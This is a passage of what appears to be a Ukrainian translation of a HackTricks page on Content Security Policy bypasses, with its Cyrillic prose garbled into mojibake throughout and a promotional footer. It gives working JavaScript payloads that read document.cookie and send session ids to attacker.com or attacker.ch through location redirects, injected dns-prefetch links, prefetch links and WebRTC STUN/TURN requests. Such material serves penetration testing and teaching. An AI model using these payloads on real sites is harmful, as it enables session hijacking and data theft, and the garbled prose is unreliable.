–ø–ª–∞–≥—ñ–Ω...\
–î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ —Ç–µ, —è–∫ –≤–∏–∫–æ–Ω–∞—Ç–∏ —Ü—é –∞—Ç–∞–∫—É, –ø–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ [https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/](https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/)

## CSP Exfiltration Bypasses

–Ø–∫—â–æ —ñ—Å–Ω—É—î —Å—É–≤–æ—Ä–∏–π CSP, —è–∫–∏–π –Ω–µ –¥–æ–∑–≤–æ–ª—è—î –≤–∞–º **–≤–∑–∞—î–º–æ–¥—ñ—è—Ç–∏ –∑ –∑–æ–≤–Ω—ñ—à–Ω—ñ–º–∏ —Å–µ—Ä–≤–µ—Ä–∞–º–∏**, —î –∫—ñ–ª—å–∫–∞ —Ä–µ—á–µ–π, —è–∫—ñ –≤–∏ –∑–∞–≤–∂–¥–∏ –º–æ–∂–µ—Ç–µ –∑—Ä–æ–±–∏—Ç–∏, —â–æ–± –µ–∫—Å—Ñ—ñ–ª—å—Ç—Ä—É–≤–∞—Ç–∏ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é.

### Location

–í–∏ –º–æ–∂–µ—Ç–µ –ø—Ä–æ—Å—Ç–æ –æ–Ω–æ–≤–∏—Ç–∏ –º—ñ—Å—Ü–µ–∑–Ω–∞—Ö–æ–¥–∂–µ–Ω–Ω—è, —â–æ–± –Ω–∞–¥—ñ—Å–ª–∞—Ç–∏ –Ω–∞ —Å–µ—Ä–≤–µ—Ä –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞ —Å–µ–∫—Ä–µ—Ç–Ω—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é:
```javascript
var sessionid = document.cookie.split('=')[1]+".";
document.location = "https://attacker.com/?" + sessionid;
```
### Meta tag

–í–∏ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–∏—Ç–∏, –≤—Å—Ç–∞–≤–∏–≤—à–∏ –º–µ—Ç–∞-—Ç–µ–≥ (—Ü–µ –ª–∏—à–µ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è, —Ü–µ –Ω–µ –ø—Ä–∏–∑–≤–µ–¥–µ –¥–æ –≤–∏—Ç–æ–∫—É –∫–æ–Ω—Ç–µ–Ω—Ç—É)
```html
<meta http-equiv="refresh" content="1; http://attacker.com">
```
### DNS Prefetch

–©–æ–± –∑–∞–≤–∞–Ω—Ç–∞–∂—É–≤–∞—Ç–∏ —Å—Ç–æ—Ä—ñ–Ω–∫–∏ —à–≤–∏–¥—à–µ, –±—Ä–∞—É–∑–µ—Ä–∏ –±—É–¥—É—Ç—å –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ —Ä–æ–∑–≤'—è–∑—É–≤–∞—Ç–∏ —ñ–º–µ–Ω–∞ —Ö–æ—Å—Ç—ñ–≤ –≤ IP-–∞–¥—Ä–µ—Å–∏ —Ç–∞ –∫–µ—à—É–≤–∞—Ç–∏ —ó—Ö –¥–ª—è –ø–æ–¥–∞–ª—å—à–æ–≥–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è.\
–í–∏ –º–æ–∂–µ—Ç–µ –≤–∫–∞–∑–∞—Ç–∏ –±—Ä–∞—É–∑–µ—Ä—É –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ —Ä–æ–∑–≤'—è–∑–∞—Ç–∏ —ñ–º'—è —Ö–æ—Å—Ç–∞ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é: `<link rel="dns-prefetch" href="something.com">`

–í–∏ –º–æ–∂–µ—Ç–µ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ —Ü—ñ—î—é –ø–æ–≤–µ–¥—ñ–Ω–∫–æ—é, —â–æ–± **–µ–∫—Å—Ç—Ä–∞–≥—É–≤–∞—Ç–∏ —á—É—Ç–ª–∏–≤—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é —á–µ—Ä–µ–∑ DNS-–∑–∞–ø–∏—Ç–∏**:
```javascript
var sessionid = document.cookie.split('=')[1]+".";
var body = document.getElementsByTagName('body')[0];
body.innerHTML = body.innerHTML + "<link rel=\"dns-prefetch\" href=\"//" + sessionid + "attacker.ch\">";
```
–Ü–Ω—à–∏–π —Å–ø–æ—Å—ñ–±:
```javascript
const linkEl = document.createElement('link');
linkEl.rel = 'prefetch';
linkEl.href = urlWithYourPreciousData;
document.head.appendChild(linkEl);
```
–©–æ–± —É–Ω–∏–∫–Ω—É—Ç–∏ —Ü—å–æ–≥–æ, —Å–µ—Ä–≤–µ—Ä –º–æ–∂–µ –Ω–∞–¥—ñ—Å–ª–∞—Ç–∏ –∑–∞–≥–æ–ª–æ–≤–æ–∫ HTTP:
```
X-DNS-Prefetch-Control: off
```
{% hint style="info" %}
–û—á–µ–≤–∏–¥–Ω–æ, —Ü—è —Ç–µ—Ö–Ω—ñ–∫–∞ –Ω–µ –ø—Ä–∞—Ü—é—î –≤ –±–µ–∑–≥–æ–ª–æ–≤–∏—Ö –±—Ä–∞—É–∑–µ—Ä–∞—Ö (–±–æ—Ç–∞—Ö)
{% endhint %}

### WebRTC

–ù–∞ –∫—ñ–ª—å–∫–æ—Ö —Å—Ç–æ—Ä—ñ–Ω–∫–∞—Ö –≤–∏ –º–æ–∂–µ—Ç–µ –ø—Ä–æ—á–∏—Ç–∞—Ç–∏, —â–æ **WebRTC –Ω–µ –ø–µ—Ä–µ–≤—ñ—Ä—è—î –ø–æ–ª—ñ—Ç–∏–∫—É `connect-src`** CSP.

–ù–∞—Å–ø—Ä–∞–≤–¥—ñ –≤–∏ –º–æ–∂–µ—Ç–µ _leak_ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ _DNS –∑–∞–ø–∏—Ç_. –û–∑–Ω–∞–π–æ–º—Ç–µ—Å—è –∑ —Ü–∏–º –∫–æ–¥–æ–º:
```javascript
(async()=>{p=new RTCPeerConnection({iceServers:[{urls: "stun:LEAK.dnsbin"}]});p.createDataChannel('');p.setLocalDescription(await p.createOffer())})()
```
–Ü–Ω—à–∏–π –≤–∞—Ä—ñ–∞–Ω—Ç:
```javascript
var pc = new RTCPeerConnection({
"iceServers":[
{"urls":[
"turn:74.125.140.127:19305?transport=udp"
],"username":"_all_your_data_belongs_to_us",
"credential":"."
}]
});
pc.createOffer().then((sdp)=>pc.setLocalDescription(sdp);
```
## –ü–µ—Ä–µ–≤—ñ—Ä–∫–∞ CSP –ø–æ–ª—ñ—Ç–∏–∫ –æ–Ω–ª–∞–π–Ω

* [https://csp-evaluator.withgoogle.com/](https://csp-evaluator.withgoogle.com)
* [https://cspvalidator.org/](https://cspvalidator.org/#url=https://cspvalidator.org/)

## –ê–≤—Ç–æ–º–∞—Ç–∏—á–Ω–µ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è CSP

[https://csper.io/docs/generating-content-security-policy](https://csper.io/docs/generating-content-security-policy)

## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

* [https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/](https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/)
* [https://lcamtuf.coredump.cx/postxss/](https://lcamtuf.coredump.cx/postxss/)
* [https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d](https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d)
* [https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme](https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme)
* [https://www.youtube.com/watch?v=MCyPuOWs3dg](https://www.youtube.com/watch?v=MCyPuOWs3dg)
* [https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/](https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/)
* [https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/)

‚Äã

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) —Å–µ—Ä–≤–µ—Ä–∞, —â–æ–± —Å–ø—ñ–ª–∫—É–≤–∞—Ç–∏—Å—è –∑ –¥–æ—Å–≤—ñ–¥—á–µ–Ω–∏–º–∏ —Ö–∞–∫–µ—Ä–∞–º–∏ —Ç–∞ —à—É–∫–∞—á–∞–º–∏ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π!

**–Ü–Ω—Å–∞–π—Ç–∏ –∑ —Ö–∞–∫—ñ–Ω–≥—É**\
–ó–∞–ª—É—á–∞–π—Ç–µ—Å—è –¥–æ –∫–æ–Ω—Ç–µ–Ω—Ç—É, —è–∫–∏–π –∑–∞–Ω—É—Ä—é—î—Ç—å—Å—è –≤ –∑–∞—Ö–æ–ø–ª–µ–Ω–Ω—è —Ç–∞ –≤–∏–∫–ª–∏–∫–∏ —Ö–∞–∫—ñ–Ω–≥—É

**–ù–æ–≤–∏–Ω–∏ —Ö–∞–∫—ñ–Ω–≥—É –≤ —Ä–µ–∞–ª—å–Ω–æ–º—É —á–∞—Å—ñ**\
–ë—É–¥—å—Ç–µ –≤ –∫—É—Ä—Å—ñ —à–≤–∏–¥–∫–æ–ø–ª–∏–Ω–Ω–æ–≥–æ —Å–≤—ñ—Ç—É —Ö–∞–∫—ñ–Ω–≥—É —á–µ—Ä–µ–∑ –Ω–æ–≤–∏–Ω–∏ —Ç–∞ —ñ–Ω—Å–∞–π—Ç–∏ –≤ —Ä–µ–∞–ª—å–Ω–æ–º—É —á–∞—Å—ñ

**–û—Å—Ç–∞–Ω–Ω—ñ –æ–≥–æ–ª–æ—à–µ–Ω–Ω—è**\
–ó–∞–ª–∏—à–∞–π—Ç–µ—Å—è –≤ –∫—É—Ä—Å—ñ –Ω–æ–≤–∏—Ö –ø—Ä–æ–≥—Ä–∞–º –≤–∏–Ω–∞–≥–æ—Ä–æ–¥ –∑–∞ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ —Ç–∞ –≤–∞–∂–ª–∏–≤–∏—Ö –æ–Ω–æ–≤–ª–µ–Ω—å –ø–ª–∞—Ç—Ñ–æ—Ä–º

**–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ –Ω–∞—Å –Ω–∞** [**Discord**](https://discord.com/invite/N3FrSbmwdy) —ñ –ø–æ—á–Ω—ñ—Ç—å —Å–ø—ñ–≤–ø—Ä–∞—Ü—é–≤–∞—Ç–∏ –∑ –ø—Ä–æ–≤—ñ–¥–Ω–∏–º–∏ —Ö–∞–∫–µ—Ä–∞–º–∏ –≤–∂–µ —Å—å–æ–≥–æ–¥–Ω—ñ!

{% hint style="success" %}
–í—á—ñ—Ç—å—Å—è —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
–í—á—ñ—Ç—å—Å—è —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞—Ç–∏ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub.

</details>
{% endhint %}
